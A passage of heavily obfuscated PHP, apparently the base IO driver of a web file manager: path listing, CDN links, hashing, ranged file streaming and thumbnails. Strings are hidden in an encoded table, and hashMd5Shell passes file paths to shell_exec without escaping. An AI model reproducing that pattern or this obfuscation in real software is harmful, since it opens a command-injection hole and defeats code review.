$this->info($÷ÍŞğà); } public function infoFull($ÒÆÁü¦–) { return $this->info($ÒÆÁü¦–); } public function infoWithChildren($àˆ–ª¡Í) { $–¨Ëú€¼ =& $_SERVER[¥Ÿ©ÒèÌ]; static $…ÛÏ¿©® = array(); if (isset($…ÛÏ¿©®[$àˆ–ª¡Í])) { return $…ÛÏ¿©®[$àˆ–ª¡Í]; } $›£¦çøª = $this->info($àˆ–ª¡Í); if ($›£¦çøª && $›£¦çøª[$–¨Ëú€¼[33]] == $–¨Ëú€¼[79]) { $¹€…‘Ãé = array($–¨Ëú€¼[80] => 0, $–¨Ëú€¼[81] => 0, $–¨Ëú€¼[82] => 0); $this->infoChildren($àˆ–ª¡Í, $¹€…‘Ãé); $›£¦çøª[$–¨Ëú€¼[80]] = $¹€…‘Ãé[$–¨Ëú€¼[80]]; $›£¦çøª[$–¨Ëú€¼[83]] = array($–¨Ëú€¼[84] => $¹€…‘Ãé[$–¨Ëú€¼[81]], $–¨Ëú€¼[85] => $¹€…‘Ãé[$–¨Ëú€¼[82]]); $…ÛÏ¿©®[$àˆ–ª¡Í] = $›£¦çøª; } return $›£¦çøª; } public function listPath($”Íç¿õü, $Õ¡ƒÅû = false) { } public function has($ã™¿ÒáØ, $ïç§ÏÃŞ = false, $±ÏÈ¾Ó = false) { } public function canRead($ùßÂ…öá) { } public function canWrite($Ÿç³ÇÁ) { } public function getContent($šÉ å°¡) { } public function setContent($“œ–«©‡, $ô½ßéŞË = '') { } protected function infoChildren($íà–±‚„, &$Ù¢½ŒÀú) { $³Şİ…÷ =& $_SERVER[¥Ÿ©ÒèÌ]; check_abort_echo(); $Ï©¦†÷Ğ = $this->listPath($íà–±‚„, !0); $Ï©¦†÷Ğ = array_merge($Ï©¦†÷Ğ[$³Şİ…÷[77]], $Ï©¦†÷Ğ[$³Şİ…÷[76]]); foreach ($Ï©¦†÷Ğ as $ğşëú­Ü) { if ($ğşëú­Ü[$³Şİ…÷[33]] == $³Şİ…÷[79]) { $Ù¢½ŒÀú[$³Şİ…÷[82]]++; $ôÈ†ıÄ¯ = $this->getPathInner($ğşëú­Ü[$³Şİ…÷[78]]); $this->infoChildren($ôÈ†ıÄ¯, $Ù¢½ŒÀú); } else { $Ù¢½ŒÀú[$³Şİ…÷[81]]++; $Ù¢½ŒÀú[$³Şİ…÷[80]] += $ğşëú­Ü[$³Şİ…÷[80]]; } } } public function fileSubstr($œËŒ¦ü, $·¡ŞòÙÔ, $è¯½â“ú) { } public function listAll($îßÕî) { } public function listAllMake($ï±î°ìª, &$‹¯Ã¢³”) { $’……½­™ =& $_SERVER[¥Ÿ©ÒèÌ]; check_abort_echo(); $ô»‚Œ‡£ = $this->listPath($ï±î°ìª, !0); if (!$ô»‚Œ‡£) { return; } $ş•íéÁÁ = array_merge($ô»‚Œ‡£[$’……½­™[77]], $ô»‚Œ‡£[$’……½­™[76]]); foreach ($ş•íéÁÁ as $ Ìßƒõ¸) { $·üû¸Œç = $ Ìßƒõ¸[$’……½­™[33]] == $’……½­™[79]; $¨’äæ¾É = array($’……½­™[78] => $ Ìßƒõ¸[$’……½­™[78]], $’……½­™[79] => $·üû¸Œç); if (isset($ Ìßƒõ¸[$’……½­™[80]])) { $¨’äæ¾É[$’……½­™[80]] = $ Ìßƒõ¸[$’……½­™[80]]; } if (isset($ Ìßƒõ¸[$’……½­™[86]])) { $¨’äæ¾É[$’……½­™[86]] = $ Ìßƒõ¸[$’……½­™[86]]; } if (!$·üû¸Œç) { $‹¯Ã¢³”[] = $¨’äæ¾É; continue; } $‹¯Ã¢³”[] = $¨’äæ¾É; $ˆÔ”·œ = $ Ìßƒõ¸[$’……½­™[78]]; $–©ÆÏ¥ê = $this->pathDriver; if (substr($ Ìßƒõ¸[$’……½­™[78]], 0, strlen($–©ÆÏ¥ê)) == $–©ÆÏ¥ê) { $ˆÔ”·œ = substr($ˆÔ”·œ, strlen($–©ÆÏ¥ê)); } $this->listAllMake($ˆÔ”·œ, $‹¯Ã¢³”); } } public function listAllSimple($óäï´à’) { $°†¾ôĞõ =& $_SERVER[¥Ÿ©ÒèÌ]; $™ÊßßÆš = array(); $äÁ’ï‚ = $this->listAll($óäï´à’); $ôŠ½¿Ìµ = $this->getPathOuter($óäï´à’); foreach ($äÁ’ï‚ as $áÎßàË±) { $çå¤‚“‹ = $áÎßàË±[$°†¾ôĞõ[78]]; $°¿­±¨ = $áÎßàË±[$°†¾ôĞõ[78]]; if (isset($áÎßàË±[$°†¾ôĞõ[87]])) { $çå¤‚“‹ = $áÎßàË±[$°†¾ôĞõ[87]][$°†¾ôĞõ[78]]; $áÎßàË±[$°†¾ôĞõ[80]] = $áÎßàË±[$°†¾ôĞõ[87]][$°†¾ôĞõ[80]]; $áÎßàË±[$°†¾ôĞõ[86]] = $áÎßàË±[$°†¾ôĞõ[87]][$°†¾ôĞõ[86]]; } else { $°¿­±¨ = substr($áÎßàË±[$°†¾ôĞõ[78]], strlen(get_path_father($ôŠ½¿Ìµ))); $°¿­±¨ = $°†¾ôĞõ[8] . ltrim($°¿­±¨, $°†¾ôĞõ[8]); } $ç‡¤ßß = array($°†¾ôĞõ[78] => $°¿­±¨, $°†¾ôĞõ[79] => $áÎßàË±[$°†¾ôĞõ[79]]); if (isset($áÎßàË±[$°†¾ôĞõ[80]]) && !$áÎßàË±[$°†¾ôĞõ[79]]) { $ç‡¤ßß[$°†¾ôĞõ[80]] = $áÎßàË±[$°†¾ôĞõ[80]]; } if (isset($áÎßàË±[$°†¾ôĞõ[86]])) { $ç‡¤ßß[$°†¾ôĞõ[86]] = $áÎßàË±[$°†¾ôĞõ[86]]; } if (!$áÎßàË±[$°†¾ôĞõ[79]]) { $ç‡¤ßß[$°†¾ôĞõ[88]] = $çå¤‚“‹; } $™ÊßßÆš[] = $ç‡¤ßß; } return $™ÊßßÆš; } public function upload($±÷¸¼’á, $ãü•›òÑ, $Ô‹Ø±±ğ = false, $ğ£“•€ = REPEAT_REPLACE) { } public function uploadFileByID($Öşü£°¸, $±ÉôÛöÔ, $ùğ‡Ö»ï) { } public function uploadFileByPath($Á–õáí, $î–Šª½Ó, $öç¼‚‡Ÿ = array()) { } public function isUploadServer() { $ğÚ˜äæ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ğÚ˜äæ[89]) { return !0; } return $GLOBALS[$ğÚ˜äæ[6]][$ğÚ˜äæ[90]][$ğÚ˜äæ[91]]; } public function isFileOutServer() { $ßòÄ¨ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ßòÄ¨[89]) { return !0; } return $GLOBALS[$ßòÄ¨[6]][$ßòÄ¨[90]][$ßòÄ¨[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($«„ùŒ²ô) { $ù÷ùêã• =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->isCdnHost()) { return $«„ùŒ²ô; } return str_replace(trim(get_url_root($«„ùŒ²ô), $ù÷ùêã•[8]), trim($this->cdnHost, $ù÷ùêã•[8]), $«„ùŒ²ô); } public function uploadLink($–‚¾¬İø, $¢‘‰Ç™ó = 0) { $Ä¢’Å =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->isUploadServer()) { return; } $½Ø¬ ñ = $this->getType(); if (!in_array($½Ø¬ ñ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $šÃĞ¥²ê = 1024 * 1024 * 10; $ÀéÇÔÃ— = $¢‘‰Ç™ó <= $šÃĞ¥²ê ? $Ä¢’Å[93] : $Ä¢’Å[94]; $úÙßâ  = (!$¢‘‰Ç™ó ? 1 : ceil($¢‘‰Ç™ó / pow(1024, 3))) * 3600 * 4; $¡êÀŞÊÔ = $this->{$ÀéÇÔÃ—}($–‚¾¬İø, $úÙßâ ); if ($¡êÀŞÊÔ) { $¡êÀŞÊÔ[$Ä¢’Å[95]] = $–‚¾¬İø; $¡êÀŞÊÔ[$Ä¢’Å[96]] = $½Ø¬ ñ; } return $¡êÀŞÊÔ; } public function uploadFormData($üÌ§Òí­, $ùÛª¬ = 3600) { } public function multiUploadFormData($¼ÂşÃã„, $ÒÔÂ‹ÄÆ = 3600) { } public function download($ŠéœîÍ¥, $™ìÂ¹§±) { } public function ext($•©†ŞÍ‚) { $Úé£âÄ =& $_SERVER[¥Ÿ©ÒèÌ]; if (strpos($•©†ŞÍ‚, $Úé£âÄ[8]) === -1) { $ƒÛâİöã = $•©†ŞÍ‚; } else { $ƒÛâİöã = $this->pathThis($•©†ŞÍ‚); } $Ë¢Á¿İ§ = $Úé£âÄ[12]; if (strstr($ƒÛâİöã, $Úé£âÄ[10])) { $Ë¢Á¿İ§ = substr($ƒÛâİöã, strrpos($ƒÛâİöã, $Úé£âÄ[10]) + 1); $Ë¢Á¿İ§ = strtolower($Ë¢Á¿İ§); } if (strlen($Ë¢Á¿İ§) > 3 && preg_match($Úé£âÄ[97], $Ë¢Á¿İ§, $‰öÚ€™Ï)) { $Ë¢Á¿İ§ = $Úé£âÄ[12]; } return $Ë¢Á¿İ§; } public function pathThis($õ’¡”é¹) { $ãÖûØ­± =& $_SERVER[¥Ÿ©ÒèÌ]; $õ’¡”é¹ = str_replace($ãÖûØ­±[98], $ãÖûØ­±[8], rtrim($õ’¡”é¹, $ãÖûØ­±[8])); $ü²É©‰û = strrpos($õ’¡”é¹, $ãÖûØ­±[8]); if ($ü²É©‰û === !1) { return $õ’¡”é¹; } return substr($õ’¡”é¹, $ü²É©‰û + 1); } public function pathFather($Úî˜µìİ) { $éïÇß¿Œ =& $_SERVER[¥Ÿ©ÒèÌ]; $Úî˜µìİ = str_replace($éïÇß¿Œ[98], $éïÇß¿Œ[8], rtrim($Úî˜µìİ, $éïÇß¿Œ[8])); $ÆçèüĞ® = strrpos($Úî˜µìİ, $éïÇß¿Œ[8]); if ($ÆçèüĞ® === !1) { return $éïÇß¿Œ[12]; } return substr($Úî˜µìİ, 0, $ÆçèüĞ® + 1); } public function hashSimple($®ßæÈÉÜ) { $¦©²æú´ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$®ßæÈÉÜ) { return md5($¦©²æú´[12]); } $Õª·¡ÉŒ = $this->size($®ßæÈÉÜ); $¨¿˜ = 200; $±Š™“ê = 50; if ($Õª·¡ÉŒ <= $¨¿˜ * $±Š™“ê) { return $this->hashMd5($®ßæÈÉÜ) . $Õª·¡ÉŒ; } $µÇÃ†” = intval($Õª·¡ÉŒ / $±Š™“ê); $û†âñÔØ = $¦©²æú´[12]; for ($¤–¬­é‡ = 0; $¤–¬­é‡ < $±Š™“ê; $¤–¬­é‡++) { $û†âñÔØ .= $this->fileSubstr($®ßæÈÉÜ, $µÇÃ†” * $¤–¬­é‡, $¨¿˜); } $û†âñÔØ .= $this->fileSubstr($®ßæÈÉÜ, $Õª·¡ÉŒ - $¨¿˜, $¨¿˜); return md5($û†âñÔØ) . $Õª·¡ÉŒ; } public static $md5Cache = array(); public function hashMd5($ÄÑ¡¬›) { if (!$ÄÑ¡¬›) { return md5($_SERVER[¥Ÿ©ÒèÌ][12]); } $ÄÑ¡¬› = $this->iconvSystem($ÄÑ¡¬›); if (isset(self::$md5Cache[$ÄÑ¡¬›])) { return self::$md5Cache[$ÄÑ¡¬›]; } self::$md5Cache[$ÄÑ¡¬›] = $this->hashMd5Shell($ÄÑ¡¬›); if (!self::$md5Cache[$ÄÑ¡¬›]) { self::$md5Cache[$ÄÑ¡¬›] = @md5_file($ÄÑ¡¬›); } return self::$md5Cache[$ÄÑ¡¬›]; } private function hashMd5Shell($Â÷óÀªì) { $Œˆ¯Â¥œ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$Â÷óÀªì) { return md5($Œˆ¯Â¥œ[12]); } if (!function_exists($Œˆ¯Â¥œ[99])) { return !1; } $ïãŞİš = array($Œˆ¯Â¥œ[100], $Œˆ¯Â¥œ[101]); $ùË‡¼Â = Cache::get($Œˆ¯Â¥œ[102]); if (!$ùË‡¼Â) { $çÑ€½¼ä = BASIC_PATH . $Œˆ¯Â¥œ[103]; $ßãìÁ›Ì = md5_file($çÑ€½¼ä); $ùË‡¼Â = $Œˆ¯Â¥œ[104]; foreach ($ïãŞİš as $ÃıâÏ×²) { $ÕÓæö»’ = shell_exec($ÃıâÏ×² . "\40\42{$çÑ€½¼ä}\x22"); if ($ÕÓæö»’ && substr(trim($ÕÓæö»’), 0, 32) == $ßãìÁ›Ì) { $ùË‡¼Â = $ÃıâÏ×²; break; } } Cache::set($Œˆ¯Â¥œ[102], $ùË‡¼Â, 3600); } if ($ùË‡¼Â == $Œˆ¯Â¥œ[104]) { return !1; } $ÕÓæö»’ = shell_exec($ùË‡¼Â . "\x20\42{$Â÷óÀªì}\x22"); $ÕÓæö»’ = str_replace($Œˆ¯Â¥œ[105], $Œˆ¯Â¥œ[12], $ÕÓæö»’); return substr($ÕÓæö»’, 0, 32); } public function link($¤øÈşµú) { return $¤øÈşµú; } public function fileOut($¶šÀĞ‘µ, $—¨ÑÅäÁ = false, $¶ñÍÚª½ = false, $ÇÂüÙçÜ = '') { $œçÁ¡şÅ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cacheMethod(null, null); if (!$¶šÀĞ‘µ || !$this->exist($¶šÀĞ‘µ)) { show_json(LNG($œçÁ¡şÅ[106]), !1, $¶ñÍÚª½); } $¥¬Ü²†Ô = $this->getType() == $œçÁ¡şÅ[107]; $µÛ‡»Ã = $GLOBALS[$œçÁ¡şÅ[6]][$œçÁ¡şÅ[90]][$œçÁ¡şÅ[108]][$œçÁ¡şÅ[109]]; $‚õÛ™ŠŠ = (double) $GLOBALS[$œçÁ¡şÅ[6]][$œçÁ¡şÅ[90]][$œçÁ¡şÅ[108]][$œçÁ¡şÅ[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $£†áãÙ = $this->infoFull($¶šÀĞ‘µ); $ã’”¼àÇ = $£†áãÙ[$œçÁ¡şÅ[80]]; $ŸÒ»’óã = gmdate($œçÁ¡şÅ[111], $£†áãÙ[$œçÁ¡şÅ[86]]); $ø·ÎèñÊ = $¶ñÍÚª½ ? $¶ñÍÚª½ : $this->iconvApp($£†áãÙ[$œçÁ¡şÅ[32]]); $÷ÕãÉ÷ú = 0; $ìñ«À´î = $ã’”¼àÇ - 1; $‰ƒŸ­“ = $this->ext($ø·ÎèñÊ); if (in_array($‰ƒŸ­“, array($œçÁ¡şÅ[112], $œçÁ¡şÅ[113], $œçÁ¡şÅ[114], $œçÁ¡şÅ[115]))) { $‰ƒŸ­“ = $œçÁ¡şÅ[116]; } if (!$ÇÂüÙçÜ) { $ÇÂüÙçÜ = md5($ŸÒ»’óã . $this->hashSimple($¶šÀĞ‘µ)); } $ÇÂüÙçÜ = $œçÁ¡şÅ[117] . $ÇÂüÙçÜ . $œçÁ¡şÅ[117]; $şÓË–ä« = get_file_mime($‰ƒŸ­“); if ($—¨ÑÅäÁ === !1 && !mime_support($şÓË–ä«)) { $—¨ÑÅäÁ = !0; $şÓË–ä« = $œçÁ¡şÅ[118]; } header($œçÁ¡şÅ[119]); header($œçÁ¡şÅ[120] . $şÓË–ä«); $İ¡²¨üä = rawurlencode($ø·ÎèñÊ); $İ¡²¨üä = $œçÁ¡şÅ[117] . $İ¡²¨üä . $œçÁ¡şÅ[121] . $İ¡²¨üä; if ($—¨ÑÅäÁ) { header($œçÁ¡şÅ[122]); header($œçÁ¡şÅ[123] . $İ¡²¨üä); } else { } header($œçÁ¡şÅ[124] . gmdate($œçÁ¡şÅ[111], time() + 3600 * 24 * 30) . $œçÁ¡şÅ[125]); header($œçÁ¡şÅ[126]); header($œçÁ¡şÅ[127]); header($œçÁ¡şÅ[128]); if (isset($_SERVER[$œçÁ¡şÅ[129]]) && strtotime($_SERVER[$œçÁ¡şÅ[129]]) == $£†áãÙ[$œçÁ¡şÅ[86]]) { header($œçÁ¡şÅ[130], !0, 304); die; } if (isset($_SERVER[$œçÁ¡şÅ[131]]) && $_SERVER[$œçÁ¡şÅ[131]] == $ÇÂüÙçÜ) { header($œçÁ¡şÅ[132] . $ÇÂüÙçÜ, !0, 304); die; } header($œçÁ¡şÅ[132] . $ÇÂüÙçÜ); header($œçÁ¡şÅ[133] . $ŸÒ»’óã . $œçÁ¡şÅ[125]); header($œçÁ¡şÅ[134] . $ø·ÎèñÊ); header($œçÁ¡şÅ[135]); header($œçÁ¡şÅ[136] . $ã’”¼àÇ); header($œçÁ¡şÅ[137]); if (!$—¨ÑÅäÁ && $‰ƒŸ­“ == $œçÁ¡şÅ[138]) { if ($ã’”¼àÇ > 1024 * 1024 * 5) { die; } $Š£æ­á = $this->getContent($¶šÀĞ‘µ); $Š£æ­á = Html::clearSVG($Š£æ­á); header($œçÁ¡şÅ[139] . strlen($Š£æ­á)); echo $Š£æ­á; die; } $şº¥Ì“« = strtolower($_SERVER[$œçÁ¡şÅ[140]]); if ($¥¬Ü²†Ô && $şº¥Ì“« && $µÛ‡»Ã) { if (strstr($şº¥Ì“«, $œçÁ¡şÅ[141])) { header($œçÁ¡şÅ[142] . $¶šÀĞ‘µ); } else { if (strstr($şº¥Ì“«, $œçÁ¡şÅ[143])) { header($œçÁ¡şÅ[144] . $¶šÀĞ‘µ); } else { if (strstr($şº¥Ì“«, $œçÁ¡şÅ[145])) { header($œçÁ¡şÅ[146] . $¶šÀĞ‘µ); } } } if ($‚õÛ™ŠŠ) { header($œçÁ¡şÅ[147] . $‚õÛ™ŠŠ); } return; } if (isset($_SERVER[$œçÁ¡şÅ[148]])) { if (preg_match($œçÁ¡şÅ[149], $_SERVER[$œçÁ¡şÅ[148]], $ÀÁõ©ç½)) { $÷ÕãÉ÷ú = intval($ÀÁõ©ç½[1]); if (!empty($ÀÁõ©ç½[2])) { $ìñ«À´î = intval($ÀÁõ©ç½[2]); } } header($œçÁ¡şÅ[150]); header("\103\157\x6e\164\145\156\164\55\122\141\156\147\145\x3a\40\x62\171\x74\x65\x73\x20{$÷ÕãÉ÷ú}\x2d{$ìñ«À´î}\x2f" . $ã’”¼àÇ); } else { header($œçÁ¡şÅ[151]); } header($œçÁ¡şÅ[152]); $ƒÉ†¦à = !0; if ($_SERVER[$œçÁ¡şÅ[153]] == $œçÁ¡şÅ[154] && $ã’”¼àÇ > 1204 * 1024 * 1024 * 2) { $ƒÉ†¦à = !1; } if ($ƒÉ†¦à) { header($œçÁ¡şÅ[155] . ($ìñ«À´î - $÷ÕãÉ÷ú + 1)); } if ($_SERVER[$œçÁ¡şÅ[156]] == $œçÁ¡şÅ[157]) { return; } $¯™Ôú‹ = 1024 * 100; $…×—îç¨ = 0; if ($‚õÛ™ŠŠ) { $…×—îç¨ = intval(1000 * 1000 * ($¯™Ôú‹ / $‚õÛ™ŠŠ)); } while ($÷ÕãÉ÷ú <= $ìñ«À´î) { $İâÈğä¥ = timeFloat(); check_abort(); $ÀñÁ¢© = $ìñ«À´î - $÷ÕãÉ÷ú + 1; if ($ÀñÁ¢© <= $¯™Ôú‹) { $¯™Ôú‹ = $ÀñÁ¢©; } echo $this->fileSubstr($¶šÀĞ‘µ, $÷ÕãÉ÷ú, $¯™Ôú‹); $÷ÕãÉ÷ú += $¯™Ôú‹; if ($¯™Ôú‹ == $ÀñÁ¢©) { $÷ÕãÉ÷ú = $ìñ«À´î + 1; } if ($…×—îç¨) { $ÜÁÏ¦ = intval(1000 * 1000 * (timeFloat() - $İâÈğä¥)); $Àƒ³ŞöÀ = $…×—îç¨ - $ÜÁÏ¦; if ($Àƒ³ŞöÀ > 5) { usleep($Àƒ³ŞöÀ); } } } } public function fileOutServer($Æß§«¾á, $š¸ÖàØû = false, $­ƒ§ÔÛ = false, $Ã³Á™ºú = '') { $this->fileOut($Æß§«¾á, $š¸ÖàØû, $­ƒ§ÔÛ, $Ã³Á™ºú); } public function fileOutLink($ĞÀŠÏ–„) { header($_SERVER[¥Ÿ©ÒèÌ][158] . $ĞÀŠÏ–„); die; } public function cacheMethod($¤öà¢ßŠ, $¡äû—Í, $ãûà€¹ù = null) { $ Á™—½ =& $_SERVER[¥Ÿ©ÒèÌ]; static $åì¬ó‘… = array(); $‚î½áéÛ = $¡äû—Í ? ltrim($this->getPathOuter($¡äû—Í), $ Á™—½[8]) : $¡äû—Í; $ˆ§ó‹ğø = $ Á™—½[159] . $¤öà¢ßŠ . $ Á™—½[160] . rtrim($‚î½áéÛ, $ Á™—½[8]); if (is_null($¤öà¢ßŠ)) { $åì¬ó‘… = array(); return; } if (is_null($¡äû—Í)) { unset($åì¬ó‘…[$ˆ§ó‹ğø]); return; } if (!is_null($ãûà€¹ù)) { $åì¬ó‘…[$ˆ§ó‹ğø] = $ãûà€¹ù; return; } $áåé´ŠÓ = isset($åì¬ó‘…[$ˆ§ó‹ğø]) ? $åì¬ó‘…[$ˆ§ó‹ğø] : null; if (!is_null($áåé´ŠÓ)) { return $áåé´ŠÓ; } $áåé´ŠÓ = $this->{$¤öà¢ßŠ}($¡äû—Í); $åì¬ó‘…[$ˆ§ó‹ğø] = $áåé´ŠÓ; return $áåé´ŠÓ; } public function fileOutImage($ÕßºŞï©, $ˆ×â„¸Ğ = 250) { $¦Æ€æÑ =& $_SERVER[¥Ÿ©ÒèÌ]; set_timeout(); if (substr($ÕßºŞï©, 0, 4) == $¦Æ€æÑ[145]) { $this->fileOutLink($ÕßºŞï©); } $ûøö×»Ò = $this->info($ÕßºŞï©); $¨Õğ› = $ûøö×»Ò[$¦Æ€æÑ[32]]; $™òÄö­¡ = !1; if (isset($GLOBALS[$¦Æ€æÑ[161]]) && $GLOBALS[$¦Æ€æÑ[161]][$¦Æ€æÑ[78]] == $ûøö×»Ò[$¦Æ€æÑ[78]]) { $ä¿Øıáò = $GLOBALS[$¦Æ€æÑ[161]][$¦Æ€æÑ[162]]; if (!$ûøö×»Ò[$¦Æ€æÑ[163]]) { $ûøö×»Ò[$¦Æ€æÑ[163]] = $GLOBALS[$¦Æ€æÑ[161]]; } if (isset($ä¿Øıáò[$¦Æ€æÑ[164]])) { if ($ä¿Øıáò[$¦Æ€æÑ[164]] <= $ˆ×â„¸Ğ && $ä¿Øıáò[$¦Æ€æÑ[165]] <= $ˆ×â„¸Ğ) { $™òÄö­¡ = !0; } } $¨Õğ› = $ûøö×»Ò[$¦Æ€æÑ[163]][$¦Æ€æÑ[32]]; } if ($ûøö×»Ò[$¦Æ€æÑ[80]] <= 1024 * 50 || $™òÄö­¡ || !function_exists($¦Æ€æÑ[166]) || $ûøö×»Ò[$¦Æ€æÑ[167]] == $¦Æ€æÑ[168]) { return $this->fileOut($ÕßºŞï©, !1, $¨Õğ›); } if (isset($ûøö×»Ò[$¦Æ€æÑ[163]][$¦Æ€æÑ[169]])) { $´£Œ×©ğ = $ûøö×»Ò[$¦Æ€æÑ[163]][$¦Æ€æÑ[169]]; } else { if (isset($ûøö×»Ò[$¦Æ€æÑ[163]][$¦Æ€æÑ[170]])) { $´£Œ×©ğ = $ûøö×»Ò[$¦Æ€æÑ[163]][$¦Æ€æÑ[170]]; } else { $´£Œ×©ğ = md5("{$ûøö×»Ò[$¦Æ€æÑ[32]]}\x5f{$ûøö×»Ò[$¦Æ€æÑ[78]]}\x5f{$ûøö×»Ò[$¦Æ€æÑ[80]]}"); } } $í¼ëÀ»‹ = "{$´£Œ×©ğ}\137{$ˆ×â„¸Ğ}\x2e\160\x6e\x67"; if (!($†õÅòëº = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¦Æ€æÑ[171]))) { $ÀÈµÔİİ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¦Æ€æÑ[172]); } else { $ÀÈµÔİİ = KodIO::make($†õÅòëº); } if ($†õÅòëº = IO::fileNameExist($ÀÈµÔİİ, $í¼ëÀ»‹)) { $ÛÆæË = KodIO::make($†õÅòëº); return IO::fileOut($ÛÆæË, !1, $¨Õğ›); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ÛÆæË = DATA_THUMB . $í¼ëÀ»‹; del_file($ÛÆæË); if (!@file_exists($ÛÆæË)) { $Ü¿ §…¹ = TEMP_FILES; if (!is_dir($Ü¿ §…¹)) { mk_dir($Ü¿ §…¹); } $äâåíşş = $Ü¿ §…¹ . $´£Œ×©ğ . $¦Æ€æÑ[10] . $ûøö×»Ò[$¦Æ€æÑ[167]]; if (!@file_exists($äâåíşş)) { $äâåíşş = $this->download($ÕßºŞï©, $äâåíşş); } ImageThumb::createThumb($äâåíşş, $ÛÆæË, $ˆ×â„¸Ğ, $ˆ×â„¸Ğ * 10); } if (!file_exists($ÛÆæË) || filesize($ÛÆæË) < 100) { return @file_exists($äâåíşş) ? IO::fileOut($äâåíşş) : $this->fileOut($ÕßºŞï©); } if (!($ò’Ÿú÷Ê = IO::move($ÛÆæË, $ÀÈµÔİİ))) { return IO::fileOut($ÛÆæË); } del_file($ÛÆæË); IO::fileOut($ò’Ÿú÷Ê); } public function fileOutImageServer($ĞóŒãÙà, $®¯ô´¿ä = 250) { $this->fileOutImage($ĞóŒãÙà, $®¯ô´¿ä); } public function fileNameAuto($Ÿ¥íà™•, $¹ªß€š±, $·¡£‰È¦ = REPEAT_RENAME, $»¡±‘Îã = false) { $ƒ‘åïıù =& $_SERVER[¥Ÿ©ÒèÌ]; $€À‘‘èü = $Ÿ¥íà™• === $ƒ‘åïıù[12] ? $¹ªß€š± : rtrim($Ÿ¥íà™•, $ƒ‘åïıù[8]) . $ƒ‘åïıù[8] . $¹ªß€š±; if ($·¡£‰È¦ == REPEAT_REPLACE || !$this->exist($€À‘‘èü) || $»¡±‘Îã && $·¡£‰È¦ != REPEAT_RENAME_FOLDER) { return $¹ªß€š±; } if ($·¡£‰È¦ == REPEAT_SKIP) { return !1; } $²Â©’á› = $ƒ‘åïıù[10] . get_path_ext($¹ªß€š±); $²Â©’á› = $²Â©’á› == $ƒ‘åïıù[10] || $»¡±‘Îã ? $ƒ‘åïıù[12] : $²Â©’á›; $„Ã’å¯¥ = 1; $å×…á›± = substr($¹ªß€š±, 0, strlen($¹ªß€š±) - strlen($²Â©’á›)); $åëÏ‡Ÿµ = $å×…á›± . "\x28{$„Ã’å¯¥}\51{$²Â©’á›}"; while ($this->exist(rtrim($Ÿ¥íà™•, $ƒ‘åïıù[8]) . $ƒ‘åïıù[8] . $åëÏ‡Ÿµ)) { $åëÏ‡Ÿµ = $å×…á›± . "\x28{$„Ã’å¯¥}\51{$²Â©’á›}"; $„Ã’å¯¥++; } return $åëÏ‡Ÿµ; } private function fileNameAutoList($†ßèûš–, $§ÊÙÅÅ, $İ»ì²µ‹ = false) { $Åİ†á— =& $_SERVER[¥Ÿ©ÒèÌ]; $Ø‰ï½äò = $this->listPath($†ßèûš–, !0); $Ø‰ï½äò = array_merge($Ø‰ï½äò[$Åİ†á—[77]], $Ø‰ï½äò[$Åİ†á—[76]]); $ªª”Ö² = array_to_keyvalue($Ø‰ï½äò, $Åİ†á—[12], $Åİ†á—[32]); $Ø¢ôéé× = $Åİ†á—[10] . get_path_ext($§ÊÙÅÅ); $Ø¢ôéé× = $Ø¢ôéé× == $Åİ†á—[10] || $İ»ì²µ‹ ? $Åİ†á—[12] : $Ø¢ôéé×; $¡³ôÑÕ = substr($§ÊÙÅÅ, 0, strlen($§ÊÙÅÅ) - strlen($Ø¢ôéé×)); $Ş”É¾¾‡ = $¡³ôÑÕ . "\x28\x30\x29{$Ø¢ôéé×}"; for ($®®›Ä = 1; $®®›Ä <= count($ªª”Ö²) + 1; $®®›Ä++) { $Ş”É¾¾‡ = $¡³ôÑÕ . "\50{$®®›Ä}\x29{$Ø¢ôéé×}"; if (!in_array_not_case($Ş”É¾¾‡, $ªª”Ö²)) { return $Ş”É¾¾‡; } } return $Ş”É¾¾‡; } public function listAllFiles($Ïõ¨ƒş˜, $ÔÍìÜ…£, $†ªÑ¸à = array()) { $•µñÔíá =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($ÔÍìÜ…£)) { return array(); } $ÅÄØƒë = array(); $Ïõ¨ƒş˜ = trim($Ïõ¨ƒş˜, $•µñÔíá[8]); foreach ($ÔÍìÜ…£ as $Äğ¨©é) { $†ıÇõ¦â = ltrim(substr(trim($Äğ¨©é, $•µñÔíá[8]), strlen($Ïõ¨ƒş˜)), $•µñÔíá[8]); $ÅÄØƒë = array_merge($ÅÄØƒë, $this->slicePath($†ıÇõ¦â)); } $¥ö¿½ËÎ = array(); foreach (array_unique($ÅÄØƒë) as $Äğ¨©é) { $÷¡Äû›› = array($•µñÔíá[78] => $this->getPathOuter($•µñÔíá[8] . $Ïõ¨ƒş˜ . $•µñÔíá[8] . $Äğ¨©é), $•µñÔíá[79] => 1, $•µñÔíá[80] => 0); if (substr($Äğ¨©é, -1) != $•µñÔíá[8]) { $÷¡Äû››[$•µñÔíá[79]] = 0; $ÑÍÍ«õ‘ = $this->getPath($Ïõ¨ƒş˜ . $•µñÔíá[8] . $Äğ¨©é); $÷¡Äû››[$•µñÔíá[80]] = isset($†ªÑ¸à[$ÑÍÍ«õ‘]) ? $†ªÑ¸à[$ÑÍÍ«õ‘] : $this->size($ÑÍÍ«õ‘); } $¥ö¿½ËÎ[] = $÷¡Äû››; } return $¥ö¿½ËÎ; } public function slicePath($Ş¿ÅÏ«û) { $ª¶‡İŠÏ =& $_SERVER[¥Ÿ©ÒèÌ]; $¦Ó¤•İû = explode($ª¶‡İŠÏ[8], trim($Ş¿ÅÏ«û, $ª¶‡İŠÏ[8])); $ˆùêÄÚõ = 0; do { ++$ˆùêÄÚõ; $¢…µÊèÜ[] = implode($ª¶‡İŠÏ[8], 